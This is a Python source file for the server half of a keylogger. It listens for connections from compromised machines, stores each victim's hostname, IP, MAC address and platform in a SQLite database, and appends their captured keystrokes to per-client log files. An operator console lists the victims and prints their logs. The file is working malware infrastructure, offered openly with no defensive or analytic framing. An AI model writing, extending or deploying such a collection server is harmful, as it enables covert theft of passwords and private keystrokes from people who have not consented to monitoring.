import socket
import threading
import sqlite3
from prettytable import from_db_cursor


class KeyloggerServer:

    def __init__(self, port, ip):
        self.port = port
        self.host = ip
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cmd = ""
        self.client_conn_object = []
        self.client_conn_object.append("")
        self.dbConn = self.create_db()


    # accept connection
    def handle_connection(self, conn, addr):
        print("\n[+]Node " + str(addr) + " has just connected!!! \n")

        fileName = str(addr) + "log.txt"
        try:
            with open(fileName, 'a') as file:
                file.close()
        except OSError:
            print("[+]unable to create file")

        data = conn.recv(65535).decode()  # receives system info from client
        self.store_node_data(self.dbConn, conn, fileName, data.split(","))# store client information

        while True:
            conn.setblocking(True)
            data = conn.recv(65535).decode()
            self.writeToTxt(data, fileName)


    def start(self):
        self.sock.bind((self.host, self.port))
        self.sock.listen(2)
        print("[+]Listening for connection on port", self.port)
        while True:
            conn, addr = self.sock.accept()
            thread1 = threading.Thread(target=self.handle_connection, args=(conn, addr))
            thread2 = threading.Thread(target=self.main)
            thread1.start()
            thread2.start()


    # creates database where connected client info will be stored
    def create_db(self):
        try:
            database_conn_object = sqlite3.connect('clientDatabase.db', check_same_thread=False)
            cursor = database_conn_object.cursor()
            # creates table if it does not exist
            cursor.execute("""CREATE TABLE IF NOT EXISTS connectedNodes(
                                Client_ID INTEGER PRIMARY KEY NOT NULL,
                                Date_Joined DATETIME DEFAULT CURRENT_TIMESTAMP,
                                Node_Name TEXT NULL,
                                IP_Address TEXT NULL,
                                Mac_Address TEXT NULL,
                                Platform TEXT NULL,
                                Release TEXT NULL,
                                Processor TEXT NULL,
                                File_Name TEXT NULL
                                );
                                """)
            # deletes whatever is in the table if it already exists
            cursor.execute('DELETE FROM connectedNodes;');
            database_conn_object.commit()  # commits changes to database
            print("[+]Database Created!!!")
            return database_conn_object  # socket connection object
        except:
            print("[-]Unable To create database!!!")


    # store client information in database when a new connection is made
    def store_node_data(self, client_database_conn, conn, fileName, client_sysinfo_list):
        cursor = client_database_conn.cursor()
        self.client_conn_object.append(conn)  # add client conn to list as socket object cant be stored in the database
        # insert client info into database
        cursor.execute(
            "INSERT INTO connectedNodes(Node_Name, IP_Address, Mac_Address, Platform, Release, Processor, File_Name) VALUES(?, ?, ?, ?, ?, ?, ?)",
            (str(client_sysinfo_list[0]), str(client_sysinfo_list[1]),
             str(client_sysinfo_list[2]), str(client_sysinfo_list[3]),
             str(client_sysinfo_list[4]), str(client_sysinfo_list[5]),
             str(fileName)
             ))
        client_database_conn.commit()  # commits changed

    #write data recieved to a text file
    def writeToTxt(self, data, fileName):
        with open(fileName, "a") as logFile:
            logFile.write(data)
            logFile.close()

    #display system information of connected nodes
    def get_nodes_info(self):
        cursor = self.dbConn.cursor()
        for conn_obj in range(1, len(self.client_conn_object)):
            try:
                # check if clients listed in database are still connected to the server
                self.client_conn_object[conn_obj].send("conn check".encode())
            except:
                # remove information from database and client_conn_object list if not connected
                self.client_conn_object.remove(self.client_conn_object[conn_obj])
                cursor.execute("DELETE FROM connectedNodes WHERE Client_ID=?", (str(conn_obj)))

        cursor.execute("SELECT * FROM connectedNodes")  # retrieve all client information in the database
        connected_client = from_db_cursor(cursor)  # insert retrieved client information into a table
        print(connected_client)

    #print connected clients
    def get_connected_clients(self):
        for client in self.client_conn_object:
            print(client)

#print out the contents of text file
    def get_file_content(self, client_id):
        cursor = self.dbConn.cursor()
        cursor.execute("SELECT File_Name FROM connectedNodes WHERE Client_ID=?", (str(client_id)))
        fileName = str(cursor.fetchall())
        fileName = fileName[3:]
        fileName = fileName[:-4]
        with open(fileName, "r") as logFile:
            lines = logFile.readlines()
            for line in lines:
                print(line)
            logFile.close()


    def main(self):
        while True:
            self.cmd = input("\n \033[1;32mKeylogger>\033[1;m ")
            if self.cmd == "nodes":
                self.get_nodes_info()
            elif "get" in self.cmd:
                self.cmd  = self.cmd.split()
                self.get_file_content(str(self.cmd[-1]))
            else:
                print("[-]Invalid command!!!")


call = KeyloggerServer(5000, socket.gethostbyname(socket.gethostname()))
call.start()

